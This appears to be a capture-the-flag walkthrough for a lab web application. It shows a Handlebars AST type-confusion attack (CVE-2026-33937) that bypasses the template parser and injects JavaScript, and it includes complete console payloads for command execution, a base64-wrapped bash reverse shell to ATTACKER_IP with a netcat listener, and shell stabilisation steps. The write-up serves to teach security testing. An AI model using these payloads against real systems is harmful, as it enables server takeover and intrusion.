==**Form encoding** (`application/x-www-form-urlencoded`) is what an HTML form produces:==

```
name=Testchar&race=Elf&class=Rogue&campaign_message=%7B%7B77%7D%7D
```

==Flat pairs joined by `&`, special characters percent-escaped. There is no syntax for nesting and no syntax for types. Whatever is written, the server receives text. To send the number 77 you send the characters `7` and `7`. To send a structure — an object with fields inside it — the format simply cannot express it.==

==**JSON** (`application/json`) can express all of it:==

```json
{
  "name": "Testchar",
  "campaign_message": {
    "type": "Program",
    "body": [ ... ]
  }
}
```

==Here `campaign_message` is not text at all. It is an object, with nested objects, arrays, numbers, booleans inside it. The server receives a real data structure, not characters to be parsed.==

==Express applications very often accept both, because it costs one line of configuration and makes the API usable by JavaScript front-ends as well as plain forms:==

```javascript
app.use(express.urlencoded({ extended: true }));  // handles form posts
app.use(express.json());                          // handles JSON posts
```

==A browser form will only ever send the first kind. Nothing stops an attacker from sending the second — with `curl`, with a Python script, or from the browser's own JavaScript console.==

==Handlebars takes a _string_, parses it into a _tree_, then compiles the tree. If the application hands Handlebars a string, the parser stands between the attacker and the compiler. If the application can instead be handed a tree directly — an object rather than text — the parser is skipped entirely, and every safety property it was providing evaporates.==

==An endpoint that accepts JSON is an endpoint where `campaign_message` can be an object instead of a string. That is the question to answer next.==
<div align="center">
<br>
<br>
</div>

**Next:** Test whether the update endpoint accepts a JSON-encoded request body.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.8 Test whether the update endpoint accepts a JSON request body

The browser form transmits `campaign_message` as form-encoded text, forcing the value through the Handlebars parser. Determine whether the same endpoint accepts `application/json`, which would permit sending structured objects instead of strings.

At `http://dzcampaigns.htb/character/15/edit`, open DevTools → Console and execute:

```javascript
const r = await fetch("/character/15", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    name: "Testchar",
    race: "Elf",
    class: "Rogue",
    backstory: "test",
    campaign_message: "JSON path works"
  })
});
console.log(r.status, await r.text());
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`fetch("/character/15", ...)`|Issues an HTTP request from the page|Sends a request by hand instead of clicking the button|
|`await`|Waits for the response before continuing|Pause here until the server replies|
|`method: "POST"`|Matches the save request captured in 2.2|Same verb the form uses|
|`credentials: "same-origin"`|Attaches the `dz.sid` session cookie|Keeps you logged in for this request|
|`"Content-Type": "application/json"`|**Declares the body as JSON**|Tells the server to expect structured data, not form text|
|`JSON.stringify({...})`|Serialises the object into a JSON body|Converts the data into what gets sent|
|`campaign_message: "JSON path works"`|Plain string marker|Tests the transport only — no payload|
|`console.log(r.status, await r.text())`|Prints status code and response body|Shows what came back|

==Executing from the browser console rather than an external tool means the request originates from the application's own origin and carries the session cookie automatically. The request is otherwise identical to the form submission except for the declared content type.==

**Result:**

```
403 '<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="utf-8" />\n  <meta name="viewport" content="width=device-width, initial-scale=1" />\n  <title>DarkZero Campaigns</title>\n  <link rel="stylesheet" href="/css/styles.css">\n</head>\n<body>\n\n  <header class="site-header">\n    <div class="site-header-inner">\n      <a class="brand" href="/">DarkZero Campaigns</a>\n\n      <nav class="primary-nav">\n        <a href="/">Home</a>\n        <a href="/essentials">Essentials</a>\n        <a href="/dice">Roll Dice</a>\n\n          <a href="/dashboard">Dashboard</a>\n          <span class="user-greeting">— nedmoeca@nimbaya.com</span>\n          <form action="/logout" method="POST" class="logout-form">\n            <input type="hidden" name="_csrf" value="88e19735640c2f42b7846c67cacebb3723181c3b3cf1723a426d22cc4dd463c4">\n            <button type="submit">Logout</button>\n          </form>\n      </nav>\n    </div>\n  </header>\n\n  <main class="page">\n    <div class="error-box">\n  <h2>Something Went Amiss</h2>\n\n  <p>Invalid CSRF token</p>\n\n\n  <div class="error-actions">\n    <a class="action-btn" href="/" data-action="back">&larr; Go Back</a>\n  </div>\n</div>\n  </main>\n\n  <footer class="site-footer">\n    <p>&mdash; DarkZero Campaigns &middot; Chronicle in progress &mdash;</p>\n  </footer>\n\n  \x3Cscript src="/js/app.js">\x3C/script>\n</body>\n</html>'
```

==**What this gives you:** Confirmation that JSON bodies are parsed, and identification of the single remaining obstacle.==

==**Key findings:**==

- ==the endpoint accepts `application/json`. The rejection reason is `Invalid CSRF token` — not a parse failure, not an unsupported media type, not a missing-field error. Reaching CSRF validation requires the body to have been deserialised first: the server read the JSON, searched it for a `_csrf` property, and rejected the request when none was present. Express is therefore running JSON body-parsing middleware alongside the form-encoded handler.==

- ==CSRF protection is enforced on the update endpoint and applies to JSON requests identically to form requests. The token is expected as a request-body field named `_csrf`, not as a header.==

- ==The token value is rendered into the HTML of application pages as a hidden input: `<input type="hidden" name="_csrf" value="..." />`. Any page loaded in an authenticated session contains a valid token, so it can be read from the DOM at request time rather than hard-coded.==

- ==The failed request wrote nothing. CSRF validation occurs before any processing of `campaign_message`.==
<div align="center">
<br>
<br>
</div>

##### ==What CSRF tokens are and why one appeared here==

==Cross-Site Request Forgery is an attack where a malicious website causes _your_ browser to send a request to a site you are logged into. Because browsers attach cookies automatically to any request bound for a given domain, that forged request arrives fully authenticated. A hidden form on an attacker's page could silently submit a password change or a funds transfer on your behalf.==

==The standard defence is a token. When the server renders a page containing a form, it embeds a random secret in that page as a hidden field and remembers it against your session. On submission, the server checks the submitted token matches. An attacker's site can make your browser send a request, but it cannot read the contents of pages on another domain, so it cannot learn the token. No token, no request.==

==Two consequences matter here.==

==The token is not an obstacle to us, because we are not a third-party site — we are operating inside the application's own origin with a legitimate session. Every page we can load contains a valid token, and JavaScript running on that page can read it with a single DOM query. CSRF protection defends against forged cross-site requests; it does nothing against a logged-in user deliberately crafting their own.==

==More usefully, the error functioned as an **oracle**. A generic rejection would have told us nothing about whether the endpoint understood JSON. Instead the server named precisely which check failed — and that check sits downstream of body parsing. The specificity of an error message frequently reveals how far into a request-handling pipeline you got, and that information is worth more here than the request succeeding would have been.==

**Next:** Include a valid CSRF token read from the page DOM and re-issue the JSON request to confirm the JSON path is functional end to end.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.9 Confirm the JSON path with a valid CSRF token

The JSON body was parsed but rejected for a missing CSRF token. Supply a valid token read from the page DOM to establish that the JSON submission path is fully functional.

At `http://dzcampaigns.htb/character/15/edit`, DevTools → Console:

```javascript
const csrf = document.querySelector('[name="_csrf"]').value;

const r = await fetch("/character/15", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    _csrf: csrf,
    name: "Testchar",
    race: "Elf",
    class: "Rogue",
    backstory: "test",
    campaign_message: "JSON path works"
  })
});
console.log(r.status, await r.text());
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`document.querySelector('[name="_csrf"]')`|Selects the first element with a `name` attribute of `_csrf`|Finds the hidden anti-forgery field on the current page|
|`.value`|Reads the element's value|Extracts the token itself|
|`_csrf: csrf`|Includes the token in the JSON body|Satisfies the check that rejected the previous request|

All other parameters are unchanged from 2.3. Because the token is read from the DOM, this must be run on a page that renders one — any authenticated page qualifies.

**Result:**

```html
200 `<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="utf-8" />\n  <meta name="viewport" content="width=device-width, initial-scale=1" />\n  <title>DarkZero Campaigns</title>\n  <link rel="stylesheet" href="/css/styles.css">\n</head>\n<body>\n\n  <header class="site-header">\n    <div class="site-header-inner">\n      <a class="brand" href="/">DarkZero Campaigns</a>\n\n      <nav class="primary-nav">\n        <a href="/">Home</a>\n        <a href="/essentials">Essentials</a>\n        <a href="/dice">Roll Dice</a>\n\n          <a href="/dashboard">Dashboard</a>\n          <span class="user-greeting">— nedmoeca@nimbaya.com</span>\n          <form action="/logout" method="POST" class="logout-form">\n            <input type="hidden" name="_csrf" value="88e19735640c2f42b7846c67cacebb3723181c3b3cf1723a426d22cc4dd463c4">\n            <button type="submit">Logout</button>\n          </form>\n      </nav>\n    </div>\n  </header>\n\n  <main class="page">\n    <div class="page-title">\n  <h1>Dashboard</h1>\n  <p class="subtitle">Welcome back, nedmoeca@nimbaya.com.</p>\n</div>\n\n<section class="dash-section">\n  <div class="section-header">\n    <h3>Your Characters</h3>\n    <a class="action-btn" href="/character/new">+ Create Character</a>\n  </div>\n\n  <ul class="character-list">\n      <li>\n        <span class="character-name">Testchar</span>\n        <span class="character-meta">&mdash; Elf Rogue</span>\n        <span class="list-actions">\n          <a class="action-btn" href="/character/15/inventory" title="Manage this character's inventory">Inventory</a>\n          <a class="action-btn" href="/character/15/edit">Edit</a>\n          <form method="POST" action="/character/15/delete" class="inline-form" data-confirm="Delete this character?">\n            <input type="hidden" name="_csrf" value="88e19735640c2f42b7846c67cacebb3723181c3b3cf1723a426d22cc4dd463c4">\n            <button class="action-btn danger" type="submit">Delete</button>\n          </form>\n        </span>\n      </li>\n  </ul>\n</section>\n  </main>\n\n  <footer class="site-footer">\n    <p>&mdash; DarkZero Campaigns &middot; Chronicle in progress &mdash;</p>\n  </footer>\n\n  \x3Cscript src="/js/app.js">\x3C/script>\n</body>\n</html>`
```

At `http://dzcampaigns.htb/campaign/1`:

```
JSON path works
Tue Jul 28 2026 21:58:22 GMT+0000 (Coordinated Universal Time)
```

![[dzcampaigns_json_message_rendered.png]]

==**What this gives you:** A working out-of-band submission channel not constrained by the HTML form.==

==**Key findings:**==

- ==The JSON path is fully functional. Status 200 with a valid token; the endpoint processes `application/json` bodies alongside form-encoded ones, meaning every field — including `campaign_message` — can be transmitted as any JSON type rather than being restricted to a string.==
- ==The CSRF token is session-scoped, not single-use. The value `88e19735640c2f42b7846c67cacebb3723181c3b3cf1723a426d22cc4dd463c4` was harvested from the 403 error page, accepted for this request, and returned again in this response. A token scraped once can be reused across multiple requests within the same session.==
- ==The 200 response body is the rendered `/dashboard` page rather than a 302 redirect stub. JSON requests receive page content directly, and that content contains fresh `_csrf` values, so a scripted client can extract the next token from the previous response without an additional page fetch.==
- ==The client-side `disabled` attribute on the creation form's message field (1.7) is irrelevant on this path. Field gating implemented in the browser has no bearing on a request constructed directly.==
- The value submitted via JSON is stored and rendered identically to one submitted via the form. The JSON path is not a partial or degraded route — it reaches the same template-rendering pipeline.

==**Submission channel established:**==

```
POST /character/15
Content-Type: application/json
Cookie: dz.sid=<session>
Body: { "_csrf": "<token>", "name": ..., "race": ..., "class": ...,
        "backstory": ..., "campaign_message": <any JSON type> }
→ 200, output rendered at /campaign/1
```

**Next:** Determine whether the application coerces `campaign_message` to a string before templating, or accepts a structured object — which would indicate the value reaches the compiler without passing through the parser.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### Submit a structured object as the template field

The JSON channel is functional, but whether the application treats `campaign_message` as a string or as a structure is undetermined. Submit a JSON object in place of the string to observe how the value is handled.

At `http://dzcampaigns.htb/character/15/edit`, DevTools → Console:

```javascript
const csrf = document.querySelector('[name="_csrf"]').value;

const ast = {
  type: "Program",
  body: [{
    type: "ContentStatement",
    value: "AST_ACCEPTED",
    original: "AST_ACCEPTED",
    loc: { start: { line: 1, column: 0 }, end: { line: 1, column: 12 } }
  }],
  strip: {},
  loc: { start: { line: 1, column: 0 }, end: { line: 1, column: 12 } }
};

const r = await fetch("/character/15", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    _csrf: csrf,
    name: "Testchar",
    race: "Elf",
    class: "Rogue",
    backstory: "test",
    campaign_message: ast
  })
});
console.log(r.status, await r.text());
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`type: "Program"`|Root node of a Handlebars syntax tree|"This is a whole template"|
|`body: [ ... ]`|Ordered list of child nodes|The parts the template is made of|
|`type: "ContentStatement"`|A literal-text node|"This bit is just plain writing, not a placeholder"|
|`value` / `original`|The literal text carried by the node|The words to print|
|`loc`|Source position, as nested `start`/`end` objects|Where in the original text this came from|
|`strip`|Whitespace-control flags|Governs trimming around the node|
|`campaign_message: ast`|Sends the object rather than a string|Hands over a structure instead of text|

The payload is inert by design — a template consisting of nothing but the literal string `AST_ACCEPTED`. It tests handling, not exploitation. The `loc` values are populated with real objects rather than `null` because the compiler dereferences `loc.start.line` during code generation and raises a TypeError on a null value.

**Result:**

```html
200 `<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="utf-8" />\n  <meta name="viewport" content="width=device-width, initial-scale=1" />\n  <title>DarkZero Campaigns</title>\n  <link rel="stylesheet" href="/css/styles.css">\n</head>\n<body>\n\n  <header class="site-header">\n    <div class="site-header-inner">\n      <a class="brand" href="/">DarkZero Campaigns</a>\n\n      <nav class="primary-nav">\n        <a href="/">Home</a>\n        <a href="/essentials">Essentials</a>\n        <a href="/dice">Roll Dice</a>\n\n          <a href="/dashboard">Dashboard</a>\n          <span class="user-greeting">— nedmoeca@nimbaya.com</span>\n          <form action="/logout" method="POST" class="logout-form">\n            <input type="hidden" name="_csrf" value="8814566c40ae0a0e639112425126f38596c0ad9994c825e8c35c70bf9bf54008">\n            <button type="submit">Logout</button>\n          </form>\n      </nav>\n    </div>\n  </header>\n\n  <main class="page">\n    <div class="page-title">\n  <h1>Dashboard</h1>\n  <p class="subtitle">Welcome back, nedmoeca@nimbaya.com.</p>\n</div>\n\n<section class="dash-section">\n  <div class="section-header">\n    <h3>Your Characters</h3>\n    <a class="action-btn" href="/character/new">+ Create Character</a>\n  </div>\n\n  <ul class="character-list">\n      <li>\n        <span class="character-name">Testchar</span>\n        <span class="character-meta">&mdash; Elf Rogue</span>\n        <span class="list-actions">\n          <a class="action-btn" href="/character/15/inventory" title="Manage this character's inventory">Inventory</a>\n          <a class="action-btn" href="/character/15/edit">Edit</a>\n          <form method="POST" action="/character/15/delete" class="inline-form" data-confirm="Delete this character?">\n            <input type="hidden" name="_csrf" value="8814566c40ae0a0e639112425126f38596c0ad9994c825e8c35c70bf9bf54008">\n            <button class="action-btn danger" type="submit">Delete</button>\n          </form>\n        </span>\n      </li>\n  </ul>\n</section>\n  </main>\n\n  <footer class="site-footer">\n    <p>&mdash; DarkZero Campaigns &middot; Chronicle in progress &mdash;</p>\n  </footer>\n\n  \x3Cscript src="/js/app.js">\x3C/script>\n</body>\n</html>`
```

At `http://dzcampaigns.htb/campaign/1`:

```
AST_ACCEPTED
Tue Jul 28 2026 22:21:26 GMT+0000 (Coordinated Universal Time)
```

![[dzcampaigns_ast_accepted.png]]

**What this gives you:** Decisive evidence about how the field is consumed, and a confirmed parser bypass.

**Key findings:**

- **The object is not coerced to a string.** JavaScript string conversion of an object yields the literal text `[object Object]`. Had the application called `String()`, `toString()`, or performed string concatenation on `campaign_message` before templating, the campaign page would display `[object Object]`. It displays `AST_ACCEPTED` instead — the text carried inside the object's `ContentStatement` node.

- **The object is consumed as a Handlebars syntax tree.** The application branches on the type of `campaign_message`: strings are parsed, objects are passed directly to the compiler as pre-parsed AST. The node structure was traversed, the `ContentStatement` recognised, and its `value` property emitted.

- **The parser is bypassed.** Every grammatical restriction observed in like the rejection of `{{7*7}}`, the absence of arithmetic, the limited helper set — is enforced by the parser at stage one. Submitting a tree skips stage one entirely. Those restrictions are not defeated; the code enforcing them never runs.

- A complete `loc` object is required on every node. The compiler reads `loc.start.line` during code generation, so nodes carrying `loc: null` raise a TypeError and produce a server-side exception rather than rendered output.

**Comparison of `campaign_message` handling:**

|Value sent|Encoding|Result|Interpretation|Simple Explanation|
|---|---|---|---|---|
|`"{{#if true}}yes{{/if}}"`|form|Renders `yes`|Parsed as a template string|Read as instructions, obeyed|
|`"{{7*7}}"`|form|Server error|Parser rejected invalid grammar|Refused — not valid template syntax|
|`"JSON path works"`|JSON|Renders verbatim|Parsed as a template string|Read as instructions, none found, printed as-is|
|`{ type: "Program", ... }`|JSON|Renders `AST_ACCEPTED`|**Consumed as a pre-parsed syntax tree**|Handed over as a ready-made structure the server used directly|
<div align="center">
<br>
<br>
</div>

##### Why "no `[object Object]`" is the whole finding

This deserves dwelling on, because the _absence_ of a particular output is doing more work here than any error message could.

In JavaScript, forcing an object into a string position produces a fixed, useless result:

```javascript
"Hello " + { a: 1 }         // "Hello [object Object]"
String({ type: "Program" }) // "[object Object]"
```

The object's contents are discarded entirely. Every object collapses to the same nine characters.

Consider what the application must be doing for each possible outcome.

If the code were `Handlebars.compile(String(campaign_message))`, an object argument would become `"[object Object]"`. Handlebars would parse that harmless text, find no placeholders, and render it unchanged. The campaign page would read `[object Object]`.

If instead the code branches — using the value as a template string when it is a string, and as a pre-parsed AST when it is an object — then an object goes straight to the compiler. The compiler assumes it received parser output, walks the tree, and emits according to each node's type. A `ContentStatement` yields its `value` verbatim.

`AST_ACCEPTED` on the page confirms the second branch. **`campaign_message` reaches Handlebars as a syntax tree when submitted as an object.**

That is the vulnerability in full. This is CVE-2026-33937 — an AST type-confusion issue in Handlebars.js, tracked as GHSA-2w6w-674q-4c4q. The library's threat model assumes trees originate from its own parser; nothing validates a tree supplied from elsewhere.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

##### What the compiler does with a node's `value`

Handlebars compiles rather than interprets. Given a tree, it generates JavaScript source text and then evaluates that source into a real function — an approach taken for speed, since rendering the same template repeatedly then costs one function call instead of a full tree walk each time.

Generation is largely textual. For a literal, the compiler writes the value into the output as a constant. For a helper invocation, it writes something along the lines of `helpers.lookup.call(context, arg1, arg2)`, filling the argument slots from the node's `params`.

For a `NumberLiteral` node the compiler does the obvious thing: it takes the node's `value` property and writes it into the generated source as a numeric constant. It does not quote it, because numbers do not need quoting. It does not validate it, because the parser guarantees that a `NumberLiteral` produced by parsing contains an actual number — the grammar makes anything else impossible.

That guarantee is exactly what is lost when a tree arrives from outside. Place a _string of JavaScript_ in a `NumberLiteral`'s `value` and the compiler writes that string, unquoted and unvalidated, directly into the source of the function it is about to build. Whatever the string says becomes part of the program.

The technique from there is ordinary code injection. The injected text closes the parenthesis of the call it was written into, appends whatever expression is wanted, and comments out the remainder of the generated line so leftover syntax does not cause a parse error. This is the same shape as SQL injection, with generated JavaScript in place of a generated query.

**Next:** Construct a `MustacheStatement` invoking the `lookup` helper with a malformed `NumberLiteral` parameter, injecting JavaScript into the generated function to achieve command execution.


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation / Initial Access

### 3.1 — Achieve remote code execution via crafted Handlebars AST (CVE-2026-33937)

The application consumes `campaign_message` as a pre-parsed syntax tree when submitted as a JSON object, bypassing the parser entirely. Construct a tree containing a node the parser could never produce, injecting JavaScript into the function the compiler generates.

At `http://dzcampaigns.htb/character/15/edit`, DevTools → Console:

```javascript
const csrf = document.querySelector('[name="_csrf"]').value;
const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };

const ast = {
  type: "Program",
  body: [{
    type: "MustacheStatement",
    path: {
      type: "PathExpression", data: false, depth: 0,
      parts: ["lookup"], original: "lookup", loc: L
    },
    params: [
      { type: "PathExpression", data: false, depth: 0,
        parts: [], original: "this", loc: L },
      { type: "NumberLiteral",
        value: "{},{})) + process.mainModule.require('child_process').execSync('id').toString() //",
        original: 1, loc: L }
    ],
    escaped: true,
    strip: { open: false, close: false },
    loc: L
  }],
  strip: {},
  loc: L
};

const r = await fetch("/character/15", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue",
    backstory: "test", campaign_message: ast
  })
});
console.log(r.status, await r.text());
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`const L = {...}`|Reusable `loc` object shared by every node|Satisfies the compiler's position lookups without repeating the object|
|`type: "MustacheStatement"`|An expression node — the compiler emits a helper call for it|An instruction, not plain text|
|`path.parts: ["lookup"]`|Names the built-in `lookup` helper as the call target|"Call the function named lookup"|
|First param: `PathExpression`, `parts: []`, `original: "this"`|Passes the current context object as argument one|"Here's the data object to search"|
|Second param: `NumberLiteral`|**The injection point** — its `value` is written into generated source unquoted|Where a number should go, JavaScript goes instead|
|`{},{}))`|Supplies two dummy arguments and closes the generated call|Finishes the sentence the compiler started|
|`+ process.mainModule.require('child_process')`|Reaches Node's module system from the template runtime|Opens the door from template-land into the real language|
|`.execSync('id')`|Executes a shell command synchronously and returns its output|Runs `id` on the server and waits for the answer|
|`.toString()`|Converts the returned Buffer to text|Makes the raw bytes printable|
|`//`|JavaScript line comment|Discards whatever the compiler wrote after the injection|
|`original: 1`|Retains a plausible source representation|Cosmetic; the compiler consumes `value`, not `original`|

**Result:**

Console:

```html
200 `<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="utf-8" />\n  <meta name="viewport" content="width=device-width, initial-scale=1" />\n  <title>DarkZero Campaigns</title>\n  <link rel="stylesheet" href="/css/styles.css">\n</head>\n<body>\n\n  <header class="site-header">\n    <div class="site-header-inner">\n      <a class="brand" href="/">DarkZero Campaigns</a>\n\n      <nav class="primary-nav">\n        <a href="/">Home</a>\n        <a href="/essentials">Essentials</a>\n        <a href="/dice">Roll Dice</a>\n\n          <a href="/dashboard">Dashboard</a>\n          <span class="user-greeting">— nedmoeca@nimbaya.com</span>\n          <form action="/logout" method="POST" class="logout-form">\n            <input type="hidden" name="_csrf" value="8814566c40ae0a0e639112425126f38596c0ad9994c825e8c35c70bf9bf54008">\n            <button type="submit">Logout</button>\n          </form>\n      </nav>\n    </div>\n  </header>\n\n  <main class="page">\n    <div class="page-title">\n  <h1>Dashboard</h1>\n  <p class="subtitle">Welcome back, nedmoeca@nimbaya.com.</p>\n</div>\n\n<section class="dash-section">\n  <div class="section-header">\n    <h3>Your Characters</h3>\n    <a class="action-btn" href="/character/new">+ Create Character</a>\n  </div>\n\n  <ul class="character-list">\n      <li>\n        <span class="character-name">Testchar</span>\n        <span class="character-meta">&mdash; Elf Rogue</span>\n        <span class="list-actions">\n          <a class="action-btn" href="/character/15/inventory" title="Manage this character's inventory">Inventory</a>\n          <a class="action-btn" href="/character/15/edit">Edit</a>\n          <form method="POST" action="/character/15/delete" class="inline-form" data-confirm="Delete this character?">\n            <input type="hidden" name="_csrf" value="8814566c40ae0a0e639112425126f38596c0ad9994c825e8c35c70bf9bf54008">\n            <button class="action-btn danger" type="submit">Delete</button>\n          </form>\n        </span>\n      </li>\n  </ul>\n</section>\n  </main>\n\n  <footer class="site-footer">\n    <p>&mdash; DarkZero Campaigns &middot; Chronicle in progress &mdash;</p>\n  </footer>\n\n  \x3Cscript src="/js/app.js">\x3C/script>\n</body>\n</html>`
```

At `http://dzcampaigns.htb/campaign/1`:

```
uid=996(darkzero) gid=987(darkzero) groups=987(darkzero)
Wed Jul 29 2026 10:04:51 GMT+0000 (Coordinated Universal Time)
```

![[dzcampaigns_rce_id.png]]

**What this gives you:** Arbitrary command execution on the target as the web application's service account.

**Key findings:**

- **Remote code execution confirmed.** The command `id` executed on the server and its output was rendered into the campaign page. Any shell command can be substituted.
- The execution context is `uid=996(darkzero) gid=987(darkzero)`. A UID below 1000 marks this as a system service account rather than an interactive user — the identity the Node.js process runs under. Code executes with exactly the web application's privileges, no more.
- The injected JavaScript reached `process.mainModule.require`, meaning the template runtime has unrestricted access to Node's module system. No sandbox, VM isolation, or module allowlist constrains the compiled template.
- Output is returned through the campaign page rather than the HTTP response, making this a blind-adjacent but fully readable execution channel. Each command requires one POST followed by one GET of `/campaign/1`.
- The payload is stored. The malicious tree persists in the database and re-executes whenever the message is re-rendered.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### How the injected string becomes executable code

Recall from 2.5.2 that Handlebars generates JavaScript source text and then evaluates it. For a helper invocation with parameters, the generated source contains a call resembling:

javascript

```javascript
helpers.lookup.call(depth0, depth0, 1, {name:"lookup", hash:{}, data:data})
```

The `1` in that line came from a `NumberLiteral` node's `value` property, written in directly with no quoting — because a number needs none — and no validation — because the parser guaranteed it was a number.

Substituting the crafted string for that `1` produces:


```javascript
helpers.lookup.call(depth0, depth0, {},{})) + process.mainModule.require('child_process').execSync('id').toString() //, {name:"lookup", hash:{}, data:data})
```

Read left to right. `{},{}` supplies two throwaway arguments so the call has a sensible shape. The `))` closes both the argument list and the enclosing expression the compiler had opened. From that point the parser is outside the call, so `+ process.mainModule.require(...)` is simply string concatenation appended to the result — a perfectly ordinary JavaScript expression. It executes, `execSync` runs the shell command, `.toString()` renders the output as text, and that text becomes what the template emits. The trailing `//` comments out everything the compiler wrote afterwards, so the leftover `, {name:"lookup"...})` never causes a syntax error.

Structurally this is identical to SQL injection: close the construct you were placed inside, append your own, comment out the remainder. The only difference is that the generated artefact is a JavaScript function rather than a query.

The reason `process.mainModule.require` is used rather than a bare `require` is scope. Inside the generated function, `require` is not in scope — the function is built by `new Function(...)`, which does not inherit the enclosing module's variables. But `process` is a true global in Node, available everywhere, and `process.mainModule` references the entry-point module object, which carries its own `require`. That indirection is the standard route from an isolated JavaScript context back into Node's module system.

**Next:** Upgrade single-command execution to an interactive reverse shell for practical post-exploitation.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 — Upgrade to an interactive reverse shell

Single-command execution requires a POST followed by a page load for each command, and returns output through a public web page. Establish a persistent interactive shell for practical post-exploitation.

**Commands:**

```bash
nc -lvnp 4444
```

At `http://dzcampaigns.htb/character/15/edit`, DevTools → Console:

```javascript
const csrf = document.querySelector('[name="_csrf"]').value;
const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };

const cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1";
const b64 = btoa(cmd);
const payload = `{},{})) + process.mainModule.require('child_process').exec('echo ${b64} | base64 -d | bash') //`;

const ast = {
  type: "Program",
  body: [{
    type: "MustacheStatement",
    path: { type: "PathExpression", data: false, depth: 0,
            parts: ["lookup"], original: "lookup", loc: L },
    params: [
      { type: "PathExpression", data: false, depth: 0,
        parts: [], original: "this", loc: L },
      { type: "NumberLiteral", value: payload, original: 1, loc: L }
    ],
    escaped: true,
    strip: { open: false, close: false },
    loc: L
  }],
  strip: {},
  loc: L
};

const r = await fetch("/character/15", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue",
    backstory: "test", campaign_message: ast
  })
});
console.log(r.status);
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`nc -lvnp 4444`|Listener: `-l` listen, `-v` verbose, `-n` no DNS, `-p` port|Waits for the target to call back|
|`bash -i`|Interactive bash|A shell that accepts typed commands|
|`>& /dev/tcp/ATTACKER_IP/4444`|Redirects stdout and stderr to a TCP socket|Sends everything the shell prints to your listener|
|`0>&1`|Redirects stdin from the same socket|Lets what you type reach the shell|
|`btoa(cmd)`|Base64-encodes the command in the browser|Avoids quoting `>&` and `0>&1` through three nested layers|
|`echo <b64> \| base64 -d \| bash`|Decodes and executes server-side|Unpacks the command and runs it|
|`.exec(...)`|**Asynchronous** child process|Returns immediately instead of waiting|

`exec` replaces `execSync` here deliberately. The synchronous variant blocks until the child exits, and a reverse shell never exits — the HTTP request would hang and time out before a prompt appeared.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/DarkZeroReturns]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.227] from (UNKNOWN) [10.129.54.208] 56902
bash: cannot set terminal process group (756): Inappropriate ioctl for device
bash: no job control in this shell
darkzero@SRV01:~$ 
```

**What this gives you:** An interactive foothold on the target as the web service account.

**Key findings:**

- Interactive shell obtained as `darkzero` on host `SRV01`.
- The hostname identifies this as the Linux application server. Earlier reconnaissance flagged Windows characteristics behind a Linux edge host (1.2, 1.3); SRV01 is that edge host, and the Windows environment lies beyond it.
- Outbound TCP to arbitrary attacker-controlled ports is unrestricted. No egress filtering interfered with the callback on port 4444.
- The shell has no controlling TTY, producing the `Inappropriate ioctl for device` and `no job control` warnings. Commands requiring a terminal — `su`, `ssh`, `sudo` with password prompt, full-screen editors — will fail until the shell is upgraded.

**Next:** Stabilise the shell to obtain a full TTY, then enumerate the application directory for stored credentials.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.3 — Stabilise the shell

**Why this step:** The netcat shell has no controlling terminal, producing job-control errors and blocking any command that requires a TTY. Allocate a pseudo-terminal and reconfigure the local terminal to obtain a fully interactive session.

**Commands:**

In the reverse shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press **Ctrl+Z** to background the session, then on the attacking host:

```bash
stty raw -echo; fg
```

Press Enter, then back in the shell:

```bash
export TERM=xterm
stty rows 50 columns 200
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`python3 -c '...'`|Executes a one-line Python program|Runs code without creating a file|
|`import pty; pty.spawn("/bin/bash")`|Allocates a pseudo-terminal and runs bash inside it|Gives the remote shell a real terminal device|
|**Ctrl+Z**|Suspends the foreground job|Puts netcat on hold so the local terminal can be reconfigured|
|`stty raw`|Disables local line buffering and signal interpretation|Passes every keystroke straight through instead of processing it|
|`-echo`|Stops the local terminal echoing typed characters|Prevents each keystroke appearing twice|
|`fg`|Resumes the suspended job|Brings netcat back to the foreground|
|`export TERM=xterm`|Declares the terminal type to the remote shell|Lets full-screen programs draw correctly|
